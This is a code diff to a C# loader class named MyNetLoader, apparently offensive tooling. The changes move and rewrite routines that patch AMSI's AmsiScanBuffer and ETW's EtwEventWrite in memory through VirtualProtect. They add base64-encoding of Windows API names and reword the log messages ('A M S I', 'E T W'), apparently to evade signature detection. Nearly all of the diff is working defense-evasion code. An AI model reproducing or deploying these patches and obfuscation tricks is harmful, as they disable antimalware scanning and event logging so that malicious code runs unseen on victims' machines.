@@ -233,48 +233,6 @@ public class MyNetLoader
 
         }
 
-
-
-
-    }
-
-    private static void PatchETW()
-    {
-        IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
-        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
-
-        VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
-
-        var patch = getETWPayload();
-        uint oldProtect;
-
-        if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
-        {
-            Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
-            Console.WriteLine("[+] Successfully unhooked ETW!");
-        }
-
-
-    }
-
-    private static string parseStringConsoleInput(string inputData, bool base64Decode)
-    {
-        if (base64Decode)
-            inputData = Encoding.UTF8.GetString(Convert.FromBase64String(inputData));
-
-        if (inputData.Trim().ToLower().Equals("x"))
-            Environment.Exit(0);
-
-        return inputData;
-
-    }
-
-    private static bool parseBoolConsoleInput(ConsoleKey consoleKey)
-    {
-        if (consoleKey == ConsoleKey.X)
-            Environment.Exit(0);
-
-        return (consoleKey == ConsoleKey.Y);
     }
 
     private static void printHelp()
@@ -305,17 +263,7 @@ public class MyNetLoader
         return buffer;
 
     }
-    private static IntPtr getAMSILocation()
-    {
-        //GetProcAddress
-        IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
-        IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");
 
-        GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
-        LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));
-
-        return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
-    }
 
     private static bool is64Bit()
     {
@@ -420,7 +368,7 @@ public class MyNetLoader
     private static IntPtr unProtect(IntPtr amsiLibPtr)
     {
 
-        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
+        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", FromB64("VmlydHVhbFByb3RlY3Q="));
 
         VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
 
@@ -435,6 +383,19 @@ public class MyNetLoader
         }
 
     }
+
+    private static IntPtr getAMSILocation()
+    {
+        //GetProcAddress
+        IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", FromB64("R2V0UHJvY0FkZHJlc3M="));
+        IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", FromB64("TG9hZExpYnJhcnlB"));
+
+        GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
+        LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));
+
+        return fGetProcAddress(fLoadLibrary("amsi.dll"), FromB64("QW1zaVNjYW5CdWZmZXI="));
+    }
+
     private static void PathAMSI()
     {
 
@@ -442,13 +403,44 @@ public class MyNetLoader
         if (amsiLibPtr != (IntPtr)0)
         {
             Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
-            Console.WriteLine("[+] Successfully patched AMSI!");
+            Console.WriteLine("[+] Successfully patched A M S I!");
         }
         else
         {
-            Console.WriteLine("[!] Patching AMSI FAILED");
+            Console.WriteLine("[!] Patching A M S I FAILED");
         }
 
     }
+
+    private static String FromB64(String b64)
+    {
+        return Encoding.UTF8.GetString(Convert.FromBase64String(b64));
+    }
+
+    private static String ToB64(String a)
+    {
+        return Convert.ToBase64String(Encoding.UTF8.GetBytes(a));
+    }
+
+    private static void PatchETW()
+    {
+        IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", FromB64("RXR3RXZlbnRXcml0ZQ=="));
+        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", FromB64("VmlydHVhbFByb3RlY3Q="));
+
+        VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
+
+        var patch = getETWPayload();
+        uint oldProtect;
+
+        if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
+        {
+            Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
+            Console.WriteLine("[+] Successfully unhooked E T W!");
+        }
+
+
+    }
+
+
 
 }
